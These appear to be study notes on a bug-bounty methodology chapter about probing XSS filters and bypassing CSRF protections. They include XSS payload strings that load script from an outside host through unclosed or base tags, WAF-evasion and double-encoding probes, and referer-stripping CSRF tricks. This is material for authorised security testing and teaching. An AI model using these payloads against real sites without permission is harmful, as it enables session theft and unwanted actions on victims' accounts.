# Common Issues I Start With — XSS & CSRF (Filter Hunting)

## Core Idea
First-pass vuln classes are chosen to expose *filters*. XSS is the ideal probe: easiest bug to prevent, so a filter's existence tells you about dev maturity — and their filter choices leak their security thinking (same blind spots recur on SSRF, uploads, CORS).

## Frameworks Introduced

- **Two-step XSS process:**
  1. **Map the filter** — send benign HTML (`<h2>`, `<img>`, `<table>`), watch reflection form (`<` vs `&lt;` vs `%3C`), then encoding probes (`%253C`, `%26lt;`, `<%00h2`, `%0d %0a %09`), incomplete tags (`<iframe src=//x?c=`), blacklist gaps (`</script/x>`, `<ScRipt>`).
  2. **Reverse-engineer the dev's regex** — they filter `<script>` but not `<script `? Blacklist of whole tags only? Then `<svg>`, `<script src=//mysite.com?c=` (unclosed, appends rest as attr value). Same blacklist probably exists on uploads and elsewhere — carry the knowledge forward.
- **WAF bypass via parameter NAME** — Akamai checked values only; payload in the param *name* reflected into `<script>` JSON context: `?"></script><base%20c%3D=href%3Dhttps:\mysite>` → rewrites `<script src>` to attacker origin.
- **Blind XSS on every parameter** — black-box means you can't see where it lands; stored/second-order fires later. "Not many researchers test every param for blind XSS — what are you losing by trying?"
- **CSRF = expected protection to challenge** — sensitive actions (account update) should have tokens; test blank/same-length tokens, referer-only checks (absent referer = no check), domain-substring referer (`theirdomain.com.evil.com`, `yoursite.com/theirdomain.com`).

## Key Concepts

- **Filter → fingerprint**: XSS filtering style predicts SSRF IP-blocklists (forget `169.254.169.254`), upload extension blacklists, CORS substring checks.
- **Encoding ladder**: raw → `%3C` → `&lt;` → `%253C`/`%26lt;` (double) → `%00 %0d %0a %09` — a reflection difference between two encodings *is* the bypass signal.
- **Referer-check bypasses**: `meta referrer=no-referrer`, `data:` iframe forms, domain-substring tricks, `theirdomain.computer`.

## Code Examples

XSS filter probes:
```html
<h2>                              (benign baseline)
<iframe src=//zseano.com/c=       (incomplete tag — attr swallows rest)
<%00h2   <%0dh2   </script/x>   <ScRipt>   (encoding/blacklist probes)
%253Cscript%253E   %26lt;script%26gt;      (double encoding)
```

Param-name WAF bypass (reflected inside `<script>` JSON):
```
?"></script><base%20c%3D=href%3Dhttps:\mysite>
```

Blank-referer CSRF:
```html
<meta name="referrer" content="no-referrer" />
<iframe src="data:text/html;base64,FORM_BASE64">
```

## Anti-patterns

- **Giving up at `&lt;script&gt;`** — different encodings tell different stories; only conclude after the encoding ladder fails.
- **Testing values only** — param names, headers, filenames are also sinks.
- **Assuming consistent filtering** — desktop may filter, mobile API may not; same for per-endpoint CSRF.

## Key Takeaways

1. `< > " '` + unicode + `%00 %07 %09 %0d%0a` go in *every* field — "leave no stone unturned."
2. A filter is a promise of a bug: document what passes, then craft around the gap.
3. Blind XSS payloads on every stored parameter — especially mobile-API-only fields.
4. CSRF: blank token, same-length token, referer tricks; different features may have *different* CSRF code — each variant is a new target.
5. Entities bypass: if reflected inside `onclick="runjs('userinput&lt;&quot;')"`, use `');alert('x');` — quote-context escapes, not HTML tags.

## Connects To

- **ch04**: SSRF/upload/IDOR filters get the same treatment
- **ch05**: where in the app to aim these (registration, profile update…)
- **ch07**: real filter-bypass findings (Akamai, blacklist bypasses)
